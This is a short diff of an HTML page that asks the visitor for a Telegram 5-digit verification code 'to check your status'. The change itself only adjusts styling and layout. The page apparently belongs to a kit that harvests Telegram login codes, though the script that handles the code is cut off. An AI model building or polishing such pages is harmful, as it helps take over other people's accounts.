@@ -1,10 +1,17 @@
-<h5 class="mt-3 text-center fw-bold" style="font-size: 25px!important">Enter Verification</h5>
+<style>
+    .dkclass {
+        height: 500px!important;
+    }
+    
+</style>
+<div style="margin-top: -50px;"><h5 class="mt-3 text-center fw-bold" style="font-size: 25px!important">Enter Verification</h5>
 <p class="mt-3 text-center">Please enter the Telegram verification code to check your status.</p>
 <div class="mb-3">
     <input type="text" class="form-control" name="phone" id="phone" placeholder="5-digit OTP" maxlength="5" />
 </div>
 <p id="wrong" class="text-center"></p>
 <button class="btdk btn mx-auto d-block px-5">NEXT STEP</button>
+</div>
 <!--<a class="d-block mb-3 text-center" href="?otherAccount">Wrong phone</a>-->
 <script>
   $("#wrong").hide();
